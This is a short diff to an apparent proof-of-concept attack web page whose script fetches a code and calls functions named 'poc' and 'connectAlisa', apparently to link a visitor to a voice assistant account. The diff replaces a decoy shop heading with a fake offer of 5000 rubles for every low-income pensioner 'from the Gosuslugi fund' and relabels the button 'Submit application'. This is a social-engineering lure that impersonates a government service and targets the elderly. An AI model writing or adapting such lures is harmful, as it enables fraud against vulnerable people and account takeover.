@@ -55,7 +55,8 @@
 <body>
 
 <div>
-    <h2>Интернет магазин детского кефира</h2>
+    <h2>5000 рублей каждому пенсионеру из фонда Госуслуг</h2>
+    <h3>При дороходе семьи менее 75.000 рубей в месяц</h3>
     <script>
         let code;
         const response = fetch('/get-code').then(async response => {
@@ -78,7 +79,7 @@
             await poc('Да')
         }
     </script>
-    <button onclick="connectAlisa()" style="font-size: 40px">Купить детский кефир</button>
+    <button onclick="connectAlisa()" style="font-size: 40px">Оставить заявку</button>
     <button onclick="fastDisconnectAlisa()">Попробуем заново?</button>
 </div>
 
